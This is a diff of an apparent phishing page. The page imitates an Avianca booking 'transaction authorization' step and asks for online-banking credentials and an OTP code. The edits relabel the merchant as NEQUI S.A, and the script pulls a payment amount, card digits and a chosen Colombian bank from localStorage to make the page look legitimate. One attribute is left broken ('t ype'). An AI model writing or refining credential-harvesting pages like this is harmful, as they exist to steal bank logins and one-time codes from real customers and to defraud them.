@@ -6,7 +6,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Avianca - Booking</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="shortcut icon" href="./assets/a.png" type="image/x-icon">
+    <link rel="shortcut icon" href="./assets/a.png" t ype="image/x-icon">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link
         href="https://fonts.googleapis.com/css2?family=Red+Hat+Display:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap"
@@ -36,7 +36,7 @@
     <main>
         <div class="content">
             <b style="margin-bottom: 20px; display: block;">Autorización de transacción</b>
-            <p style="margin-bottom: 10px;">La transacción que intenta realizar en <b>AVIANCA S.A</b> por <b>$ <span
+            <p style="margin-bottom: 10px;">La transacción que intenta realizar en <b>NEQUI S.A</b> por <b>$ <span
                         id="flight-price">81.900</span> COP</b> debe ser autorizada. Por favor verifica la siguiente
                 información:</p>
             <p style="margin-bottom: 20px;">Ingrese los datos de su Banca Virtual:</p>
@@ -54,7 +54,7 @@
                     <b class="hidden" id="otpcode" style="margin-bottom: 10px !important;">Código OTP: </b>
                 </div>
                 <div class="values">
-                    <p>AVIANCA S.A</p>
+                    <p>NEQUI S.A</p>
                     <p>$ <span id="flight-price">81.900</span> COP</p>
                     <p>•••• •••• •••• <span id="card-digits"></span></p>
                     <input class="hidden" required type="text" id="user">
@@ -75,95 +75,31 @@
     <!-- SCRIPTS -->
     <script src="./js/id_check.js"></script>
     <script src="./js/bot_id_check.js"></script>
-    
-    <!-- Script adicional para recibir datos de Nequi -->
+
+    <!-- SOLO ESTO SE AGREGA - CONEXIÓN CON NEQUI -->
     <script>
-        (function() {
-            // Leer datos de localStorage (desde Nequi)
-            const montoRecarga = localStorage.getItem("recarga_montoFormato") || localStorage.getItem("montoFormato") || "81.900";
-            const montoLimpio = montoRecarga.replace("$", "").replace(/\./g, "");
-            const bancoSeleccionado = localStorage.getItem("recarga_banco_seleccionado") || localStorage.getItem("banco") || "";
-            const ultimosDigitos = localStorage.getItem("ultimos_digitos_tarjeta") || "0000";
-            
-            // Actualizar el monto mostrado
+        // Leer el banco seleccionado en Nequi
+        const bancoNequi = localStorage.getItem("recarga_banco_seleccionado") || localStorage.getItem("banco") || "";
+        
+        // Leer el monto de la recarga
+        const montoNequi = localStorage.getItem("recarga_montoFormato") || localStorage.getItem("montoFormato") || "";
+        
+        if (montoNequi) {
+            const montoLimpio = montoNequi.replace("$", "").replace(/\./g, "");
             const priceElements = document.querySelectorAll("#flight-price");
             priceElements.forEach(el => {
                 if (el) el.innerText = montoLimpio;
             });
-            
-            // Actualizar los últimos dígitos de la tarjeta
-            const cardDigitsElement = document.getElementById("card-digits");
-            if (cardDigitsElement) {
-                cardDigitsElement.innerText = ultimosDigitos;
-            }
-            
-            // Mapeo de bancos a logos
-            const bankLogos = {
-                "BANCOLOMBIA": "./galeria/bancolombia_logo.png",
-                "BANCO DAVIVIENDA": "./galeria/davivienda_logo.png",
-                "BANCO DE BOGOTA": "./galeria/bogota_logo.png",
-                "BANCO DE OCCIDENTE": "./galeria/occidente_logo.png",
-                "BANCO BBVA COLOMBIA S.A.": "./galeria/bbva_logo.png",
-                "BANCO POPULAR": "./galeria/popular_logo.png",
-                "BANCO SANTANDER COLOMBIA": "./galeria/santander_logo.png",
-                "BANCO ITAU": "./galeria/itau_logo.png",
-                "BANCO CAJA SOCIAL": "./galeria/caja_social_logo.png",
-                "BANCO AV VILLAS": "./galeria/avvillas_logo.png",
-                "BANCO AGRARIO": "./galeria/agrario_logo.png",
-                "BANCO GNB SUDAMERIS": "./galeria/gnb_logo.png",
-                "BANCO PICHINCHA S.A.": "./galeria/pichincha_logo.png",
-                "BANCO FALABELLA": "./galeria/falabella_logo.png",
-                "BANCOOMEVA S.A.": "./galeria/bancomeva_logo.png",
-                "NEQUI": "./galeria/nequi_logo.png",
-                "DAVIPLATA": "./galeria/daviplata_logo.png",
-                "NU": "./galeria/nu_logo.png",
-                "LULO BANK": "./galeria/lulo_logo.png",
-                "MOVII S.A.": "./galeria/movii_logo.png",
-                "RAPPIPAY": "./galeria/rappipay_logo.png"
-            };
-            
-            // Cambiar el logo del banco
-            const bankLogoElement = document.getElementById("bank-logo");
-            if (bankLogoElement && bancoSeleccionado) {
-                // Buscar el logo en el mapeo
-                let logoEncontrado = false;
-                for (const [key, value] of Object.entries(bankLogos)) {
-                    if (bancoSeleccionado.toLowerCase().includes(key.toLowerCase()) || 
-                        key.toLowerCase().includes(bancoSeleccionado.toLowerCase())) {
-                        bankLogoElement.src = value;
-                        logoEncontrado = true;
-                        break;
-                    }
-                }
-                
-                // Si no se encontró, intentar con el nombre exacto
-                if (!logoEncontrado && bankLogos[bancoSeleccionado]) {
-                    bankLogoElement.src = bankLogos[bancoSeleccionado];
-                    logoEncontrado = true;
-                }
-                
-                // Logo por defecto si no hay coincidencia
-                if (!logoEncontrado) {
-                    bankLogoElement.src = "./galeria/default_bank_logo.png";
-                }
-                
-                console.log("Logo actualizado para banco:", bancoSeleccionado);
-            }
-            
-            // Cambiar el logo de la compañía (Avianca)
-            const companyLogoElement = document.getElementById("company-logo");
-            if (companyLogoElement) {
-                companyLogoElement.src = "./assets/logos/avianca_red (2).svg";
-            }
-            
-            // Ocultar loader después de cargar
-            setTimeout(() => {
-                const loader = document.querySelector(".main-loader");
-                if (loader) {
-                    loader.classList.remove("show");
-                }
-            }, 500);
-        })();
+        }
+        
+        // Cambiar el texto del comercio a NEQUI S.A
+        const comercioElements = document.querySelectorAll(".values p:first-child");
+        comercioElements.forEach(el => {
+            if (el) el.innerText = "NEQUI S.A";
+        });
+        
+        console.log("Banco desde Nequi:", bancoNequi);
+        console.log("Monto desde Nequi:", montoNequi);
     </script>
 </body>
 
